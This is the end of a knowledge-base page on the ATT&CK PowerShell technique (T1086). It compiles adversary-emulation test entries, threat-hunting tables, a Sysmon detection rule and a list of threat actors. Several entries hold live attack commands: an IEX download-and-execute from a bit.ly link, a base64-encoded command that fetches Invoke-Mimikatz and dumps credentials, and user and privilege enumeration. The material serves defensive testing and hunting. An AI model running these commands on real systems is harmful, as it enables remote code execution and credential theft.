                                                                                              '"NTFS") '
                                                                                              '{exit '
                                                                                              '0} '
                                                                                              'else '
                                                                                              '{exit '
                                                                                              '1}\n'}],
                                                          'description': 'Creates '
                                                                         'a '
                                                                         'file '
                                                                         'with '
                                                                         'an '
                                                                         'alternate '
                                                                         'data '
                                                                         'stream '
                                                                         'and '
                                                                         'simulates '
                                                                         'executing '
                                                                         'that '
                                                                         'hidden '
                                                                         'code/file. '
                                                                         'Upon '
                                                                         'execution, '
                                                                         '"Stream '
                                                                         'Data '
                                                                         'Executed" '
                                                                         'will '
                                                                         'be '
                                                                         'displayed.\n',
                                                          'executor': {'cleanup_command': 'Remove-Item '
                                                                                          '#{ads_file} '
                                                                                          '-Force '
                                                                                          '-ErrorAction '
                                                                                          'Ignore\n',
                                                                       'command': 'Add-Content '
                                                                                  '-Path '
                                                                                  '#{ads_file} '
                                                                                  '-Value '
                                                                                  "'Write-Host "
                                                                                  '"Stream '
                                                                                  'Data '
                                                                                  'Executed"\' '
                                                                                  '-Stream '
                                                                                  "'streamCommand'\n"
                                                                                  '$streamcommand '
                                                                                  '= '
                                                                                  'Get-Content '
                                                                                  '-Path '
                                                                                  '#{ads_file} '
                                                                                  '-Stream '
                                                                                  "'streamcommand'\n"
                                                                                  'Invoke-Expression '
                                                                                  '$streamcommand\n',
                                                                       'elevation_required': False,
                                                                       'name': 'powershell'},
                                                          'input_arguments': {'ads_file': {'default': '$env:TEMP\\NTFS_ADS.txt',
                                                                                           'description': 'File '
                                                                                                          'created '
                                                                                                          'to '
                                                                                                          'store '
                                                                                                          'Alternate '
                                                                                                          'Stream '
                                                                                                          'Data',
                                                                                           'type': 'String'}},
                                                          'name': 'NTFS '
                                                                  'Alternate '
                                                                  'Data Stream '
                                                                  'Access',
                                                          'supported_platforms': ['windows']}],
                                        'attack_technique': 'T1086',
                                        'display_name': 'PowerShell'}},
 {'Mitre Stockpile - Capture running processes via PowerShell': {'description': 'Capture '
                                                                                'running '
                                                                                'processes '
                                                                                'via '
                                                                                'PowerShell',
                                                                 'id': '4d9b079c-9ede-4116-8b14-72ad3a5533af',
                                                                 'name': 'PowerShell '
                                                                         'Process '
                                                                         'Enumeration',
                                                                 'platforms': {'windows': {'psh,pwsh': {'command': 'get-process '
                                                                                                                   '>> '
                                                                                                                   '$env:APPDATA\\vmtools.log;\n'
                                                                                                                   'cat '
                                                                                                                   '$env:APPDATA\\vmtools.log\n'}}},
                                                                 'tactic': 'collection',
                                                                 'technique': {'attack_id': 'T1086',
                                                                               'name': 'PowerShell '
                                                                                       'Collection'}}},
 {'Mitre Stockpile - User enumeration': {'description': 'User enumeration',
                                         'id': '55678719-e76e-4df9-92aa-10655bbd1cf4',
                                         'name': 'cmd.exe information '
                                                 'gathering',
                                         'platforms': {'windows': {'psh': {'command': 'cmd.exe '
                                                                                      '/c '
                                                                                      '"net '
                                                                                      'user" '
                                                                                      '>> '
                                                                                      'C:\\Windows\\temp\\history.log;\n'
                                                                                      'cmd.exe '
                                                                                      '/c '
                                                                                      '"whoami '
                                                                                      '/priv" '
                                                                                      '>> '
                                                                                      'C:\\Windows\\temp\\history.log;\n'
                                                                                      'cmd.exe '
                                                                                      '/c '
                                                                                      '"netstat '
                                                                                      '-ano" '
                                                                                      '>> '
                                                                                      'C:\\Windows\\temp\\history.log;'}}},
                                         'tactic': 'collection',
                                         'technique': {'attack_id': 'T1086',
                                                       'name': 'PowerShell'}}},
 {'Mitre Stockpile - System Information Gathering Script': {'description': 'System '
                                                                           'Information '
                                                                           'Gathering '
                                                                           'Script',
                                                            'id': '702bfdd2-9947-4eda-b551-c3a1ea9a59a2',
                                                            'name': 'PowerShell '
                                                                    'information '
                                                                    'gathering',
                                                            'platforms': {'windows': {'psh,pwsh': {'command': 'powershell.exe '
                                                                                                              '-c '
                                                                                                              '"Get-WmiObject '
                                                                                                              '-class '
                                                                                                              'win32_operatingsystem '
                                                                                                              '| '
                                                                                                              'select '
                                                                                                              '-property '
                                                                                                              '* '
                                                                                                              '| '
                                                                                                              'export-csv '
                                                                                                              'msdebug.log";'}}},
                                                            'tactic': 'collection',
                                                            'technique': {'attack_id': 'T1086',
                                                                          'name': 'PowerShell'}}},
 {'Mitre Stockpile - Determine whether or not UAC is enabled': {'description': 'Determine '
                                                                               'whether '
                                                                               'or '
                                                                               'not '
                                                                               'UAC '
                                                                               'is '
                                                                               'enabled',
                                                                'id': '7c42a30c-c8c7-44c5-80a8-862d364ac1e4',
                                                                'name': 'UAC '
                                                                        'Status',
                                                                'platforms': {'windows': {'psh,pwsh': {'command': 'echo '
                                                                                                                  '$(get-uac)\n'}}},
                                                                'tactic': 'collection',
                                                                'technique': {'attack_id': 'T1086',
                                                                              'name': 'PowerShell '
                                                                                      'Collection'}}},
 {'Mitre Stockpile - Copy powershell to non-standard location and perform triage commands': {'description': 'Copy '
                                                                                                            'powershell '
                                                                                                            'to '
                                                                                                            'non-standard '
                                                                                                            'location '
                                                                                                            'and '
                                                                                                            'perform '
                                                                                                            'triage '
                                                                                                            'commands',
                                                                                             'id': 'e5f9de8f-3df1-4e78-ad92-a784e3f6770d',
                                                                                             'name': 'Move '
                                                                                                     'Powershell '
                                                                                                     '& '
                                                                                                     'triage',
                                                                                             'platforms': {'windows': {'psh': {'command': 'Copy-Item '
                                                                                                                                          'C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe '
                                                                                                                                          'C:\\Windows\\Temp\\debug.exe;\n'
                                                                                                                                          'C:\\Windows\\Temp\\debug.exe '
                                                                                                                                          'get-process '
                                                                                                                                          '>> '
                                                                                                                                          'C:\\Windows\\temp\\debug.log;\n'
                                                                                                                                          'C:\\Windows\\Temp\\debug.exe '
                                                                                                                                          'get-localgroup '
                                                                                                                                          '>> '
                                                                                                                                          'C:\\Windows\\temp\\debug.log;\n'
                                                                                                                                          'C:\\Windows\\Temp\\debug.exe '
                                                                                                                                          'get-localuser '
                                                                                                                                          '>> '
                                                                                                                                          'C:\\Windows\\temp\\debug.log;\n'
                                                                                                                                          'C:\\Windows\\Temp\\debug.exe '
                                                                                                                                          'Get-ItemProperty '
                                                                                                                                          'Registry::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion '
                                                                                                                                          '>> '
                                                                                                                                          'C:\\Windows\\temp\\debug.log;\n'}}},
                                                                                             'tactic': 'defense-evasion',
                                                                                             'technique': {'attack_id': 'T1086',
                                                                                                           'name': 'PowerShell'}}},
 {'Mitre Stockpile - Emulate administrator tasks on a system in a separate process': {'description': 'Emulate '
                                                                                                     'administrator '
                                                                                                     'tasks '
                                                                                                     'on '
                                                                                                     'a '
                                                                                                     'system '
                                                                                                     'in '
                                                                                                     'a '
                                                                                                     'separate '
                                                                                                     'process',
                                                                                      'id': '315cedf1-4a3a-4015-b63f-149d64bacbbc',
                                                                                      'name': 'Emulate '
                                                                                              'Administrator '
                                                                                              'Tasks',
                                                                                      'platforms': {'windows': {'psh,pwsh': {'cleanup': 'Remove-Item '
                                                                                                                                        '-Force '
                                                                                                                                        '-Path '
                                                                                                                                        '".\\Emulate-Administrator-Tasks.ps1"\n',
                                                                                                                             'command': 'start '
                                                                                                                                        'powershell.exe '
                                                                                                                                        '-ArgumentList '
                                                                                                                                        '"-NoP","-StA","-ExecutionPolicy","bypass",".\\Emulate-Administrator-Tasks.ps1"\n',
                                                                                                                             'payloads': ['Emulate-Administrator-Tasks.ps1']}}},
                                                                                      'tactic': 'execution',
                                                                                      'technique': {'attack_id': 'T1086',
                                                                                                    'name': 'PowerShell'}}},
 {'Mitre Stockpile - Download': {'description': 'Download',
                                 'id': 'bfff9006-d1fb-46ce-b173-92cb04e9a031',
                                 'name': 'PowerShell bitly Link Download',
                                 'platforms': {'windows': {'psh': {'command': 'powershell.exe '
                                                                              '-c '
                                                                              'IEX '
                                                                              '(New-Object '
                                                                              'Net.Webclient).downloadstring("https://bit.ly/33H0QXi") \n'}}},
                                 'tactic': 'execution',
                                 'technique': {'attack_id': 'T1086',
                                               'name': 'PowerShell'}}},
 {'Mitre Stockpile - Download': {'description': 'Download',
                                 'id': 'ccdb8caf-c69e-424b-b930-551969450c57',
                                 'name': 'PowerShell Invoke MimiKats',
                                 'platforms': {'windows': {'psh': {'command': 'powershell '
                                                                              '-enc '
                                                                              'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8ARQBtAHAAaQByAGUAUAByAG8AagBlAGMAdAAvAEUAbQBwAGkAcgBlAC8ANwBhADMAOQBhADUANQBmADEAMgA3AGIAMQBhAGUAYgA5ADUAMQBiADMAZAA5AGQAOAAwAGMANgBkAGMANgA0ADUAMAAwAGMAYQBjAGIANQAvAGQAYQB0AGEALwBtAG8AZAB1AGwAZQBfAHMAbwB1AHIAYwBlAC8AYwByAGUAZABlAG4AdABpAGEAbABzAC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAiACkAOwAgACQAbQAgAD0AIABJAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAegAgAC0ARAB1AG0AcABDAHIAZQBkAHMAOwAgACQAbQAKAA==\n'}}},
                                 'tactic': 'execution',
                                 'technique': {'attack_id': 'T1086',
                                               'name': 'PowerShell'}}},
 {'Mitre Stockpile - Download and install PSTools by unzipping the file': {'description': 'Download '
                                                                                          'and '
                                                                                          'install '
                                                                                          'PSTools '
                                                                                          'by '
                                                                                          'unzipping '
                                                                                          'the '
                                                                                          'file',
                                                                           'id': 'eb814e03-811a-467a-bc6d-dcd453750fa2',
                                                                           'name': 'Install '
                                                                                   'PSTools',
                                                                           'platforms': {'windows': {'psh': {'command': '[System.Net.ServicePointManager]::ServerCertificateValidationCallback '
                                                                                                                        '= '
                                                                                                                        '{ '
                                                                                                                        '$True '
                                                                                                                        '};\n'
                                                                                                                        '$web '
                                                                                                                        '= '
                                                                                                                        '(New-Object '
                                                                                                                        'System.Net.WebClient);\n'
                                                                                                                        '$result '
                                                                                                                        '= '
                                                                                                                        '$web.DownloadFile("https://download.sysinternals.com/files/PSTools.zip", '
                                                                                                                        '"PSTools.zip");\n'
                                                                                                                        'New-Item '
                                                                                                                        '-ItemType '
                                                                                                                        '"directory" '
                                                                                                                        'C:\\Windows\\System32\\PSTools '
                                                                                                                        '-Force;\n'
                                                                                                                        'Add-Type '
                                                                                                                        '-Assembly '
                                                                                                                        "'System.IO.Compression.FileSystem'; "
                                                                                                                        '[System.IO.Compression.ZipFile]::ExtractToDirectory("PSTools.zip", '
                                                                                                                        '"C:\\Windows\\System32\\PSTools");\n'}}},
                                                                           'tactic': 'execution',
                                                                           'technique': {'attack_id': 'T1086',
                                                                                         'name': 'PowerShell'}}},
 {'Threat Hunting Tables': {'chain_id': '100025',
                            'commandline_string': '',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'low',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1086',
                            'mitre_caption': 'powershell',
                            'os': 'windows',
                            'parent_process': 'excel.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': 'cmd.exe',
                            'sub_process_2': 'powershell.exe'}},
 {'Threat Hunting Tables': {'chain_id': '100029',
                            'commandline_string': '',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'rare',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1086',
                            'mitre_caption': 'scripting',
                            'os': 'windows',
                            'parent_process': 'excel.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': 'powershell.exe',
                            'sub_process_2': ''}},
 {'Threat Hunting Tables': {'chain_id': '100042',
                            'commandline_string': '',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'low',
                            'itw_sample': '3560481cc51a08c94cd5649b2782ec1395d56d9a1721e6e03720420898772ed0',
                            'loaded_dll': '',
                            'mitre_attack': 'T1086',
                            'mitre_caption': 'scripting',
                            'os': 'windows',
                            'parent_process': 'mshta.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': 'cmd.exe',
                            'sub_process_2': 'powershell.exe'}},
 {'Threat Hunting Tables': {'chain_id': '100045',
                            'commandline_string': '',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'low',
                            'itw_sample': 'ee29b9c01318a1e23836b949942db14d4811246fdae2f41df9f0dcd922c63bc6',
                            'loaded_dll': '',
                            'mitre_attack': 'T1086',
                            'mitre_caption': 'scripting',
                            'os': 'windows',
                            'parent_process': 'mshta.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': 'powershell.exe',
                            'sub_process_2': ''}},
 {'Threat Hunting Tables': {'chain_id': '100056',
                            'commandline_string': '',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'rare',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1086',
                            'mitre_caption': 'powershell',
                            'os': 'windows',
                            'parent_process': 'powerpoint.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': 'cmd.exe',
                            'sub_process_2': 'powershell.exe'}},
 {'Threat Hunting Tables': {'chain_id': '100060',
                            'commandline_string': '',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'rare',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1086',
                            'mitre_caption': 'powershell',
                            'os': 'windows',
                            'parent_process': 'powerpoint.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': 'powershell.exe',
                            'sub_process_2': ''}},
 {'Threat Hunting Tables': {'chain_id': '100064',
                            'commandline_string': 'webClient.DownloadString(',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'low',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1086',
                            'mitre_caption': 'powershell',
                            'os': 'windows',
                            'parent_process': 'powershell.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': '',
                            'sub_process_2': ''}},
 {'Threat Hunting Tables': {'chain_id': '100065',
                            'commandline_string': 'webClient.DownloadFile',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'low',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1086',
                            'mitre_caption': 'powershell',
                            'os': 'windows',
                            'parent_process': 'powershell.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': '',
                            'sub_process_2': ''}},
 {'Threat Hunting Tables': {'chain_id': '100066',
                            'commandline_string': 'webClient.DownloadData',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'low',
                            'itw_sample': 'https://www.joesandbox.com/analysis/35219/0/html',
                            'loaded_dll': '',
                            'mitre_attack': 'T1086',
                            'mitre_caption': 'powershell',
                            'os': 'windows',
                            'parent_process': 'powershell.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': '',
                            'sub_process_2': ''}},
 {'Threat Hunting Tables': {'chain_id': '100092',
                            'commandline_string': '',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'rare',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1086',
                            'mitre_caption': 'powershell',
                            'os': 'windows',
                            'parent_process': 'winword.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': 'powershell.exe',
                            'sub_process_2': ''}},
 {'SysmonHunter - T1086': {'description': None,
                           'level': 'high',
                           'name': 'PowerShell',
                           'phase': 'Execution',
                           'query': [{'process': {'cmdline': {'pattern': 'hidden|-enc|-NonI'},
                                                  'image': {'flag': 'regex',
                                                            'pattern': '\\\\Windows\\\\.+\\\\WindowsPowerShell\\\\.+\\\\powershell.exe'}},
                                      'type': 'process'}]}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1086',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/lateral_movement/invoke_psremoting":  '
                                                                                 '["T1086"],',
                                            'Empire Module': 'powershell/lateral_movement/invoke_psremoting',
                                            'Technique': 'PowerShell'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1086',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/management/spawn":  '
                                                                                 '["T1086"],',
                                            'Empire Module': 'powershell/management/spawn',
                                            'Technique': 'PowerShell'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1086',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"python/management/multi/spawn":  '
                                                                                 '["T1086"],',
                                            'Empire Module': 'python/management/multi/spawn',
                                            'Technique': 'PowerShell'}}]
```

# Tactics


* [Execution](../tactics/Execution.md)


# Mitigations

None

# Actors


* [APT32](../actors/APT32.md)

* [Turla](../actors/Turla.md)
    
* [APT29](../actors/APT29.md)
    
* [FIN10](../actors/FIN10.md)
    
* [FIN7](../actors/FIN7.md)
    
* [Poseidon Group](../actors/Poseidon-Group.md)
    
* [FIN6](../actors/FIN6.md)
    
* [Threat Group-3390](../actors/Threat-Group-3390.md)
    
* [Leviathan](../actors/Leviathan.md)
    
* [CopyKittens](../actors/CopyKittens.md)
    
* [APT19](../actors/APT19.md)
    
* [APT3](../actors/APT3.md)
    
* [Patchwork](../actors/Patchwork.md)
    
* [Stealth Falcon](../actors/Stealth-Falcon.md)
    
* [DarkHydrus](../actors/DarkHydrus.md)
    
* [APT28](../actors/APT28.md)
    
* [OilRig](../actors/OilRig.md)
    
* [Deep Panda](../actors/Deep-Panda.md)
    
* [TA459](../actors/TA459.md)
    
* [Thrip](../actors/Thrip.md)
    
* [Magic Hound](../actors/Magic-Hound.md)
    
* [Cobalt Group](../actors/Cobalt-Group.md)
    
* [Dragonfly 2.0](../actors/Dragonfly-2.0.md)
    
* [FIN8](../actors/FIN8.md)
    
* [menuPass](../actors/menuPass.md)
    
* [BRONZE BUTLER](../actors/BRONZE-BUTLER.md)
    
* [Gorgon Group](../actors/Gorgon-Group.md)
    
* [MuddyWater](../actors/MuddyWater.md)
    
* [Gallmaker](../actors/Gallmaker.md)
    
* [APT33](../actors/APT33.md)
    
* [TEMP.Veles](../actors/TEMP.Veles.md)
    
* [WIRTE](../actors/WIRTE.md)
    
* [TA505](../actors/TA505.md)
    
* [Soft Cell](../actors/Soft-Cell.md)
    
* [Kimsuky](../actors/Kimsuky.md)
    
* [APT41](../actors/APT41.md)
    
